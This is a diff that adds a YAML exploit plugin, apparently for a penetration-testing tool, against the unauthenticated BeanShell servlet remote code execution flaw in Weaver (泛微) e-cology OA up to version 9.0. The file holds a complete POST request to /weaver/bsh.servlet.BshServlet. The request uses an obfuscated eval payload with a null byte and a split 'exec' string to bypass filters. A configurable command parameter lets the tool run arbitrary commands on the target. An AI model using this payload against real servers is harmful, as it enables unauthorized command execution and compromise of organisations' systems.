@@ -1,0 +1,35 @@
+info:
+    app: 泛微OA
+    name: BshServlet
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2019-09-17"
+    create_date: "2024-10-06 09:25:34"
+    update_date: "2024-10-06 09:25:34"
+    scope: 泛微e-cology OA <=9.0
+    description: 泛微e-cology OA系统自带BeanShell组件被爆出存在远程代码执行漏洞。攻击者通过调用BeanShell组件中未授权访问的问题接口可直接在目标服务器上执行任意命令。
+    detail: |-
+        http://www.test.com/weaver/bsh.servlet.BshServlet
+        目前只支持cmd
+        cmd /c
+        /bin/bash -c
+    payload: |-
+        POST /weaver/bsh.servlet.BshServlet HTTP/1.1
+        Host: www.test.com
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Connection: close
+        Accept-Encoding: gzip, deflate
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 109
+
+        bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
+payloads:
+    - name: cmd1
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
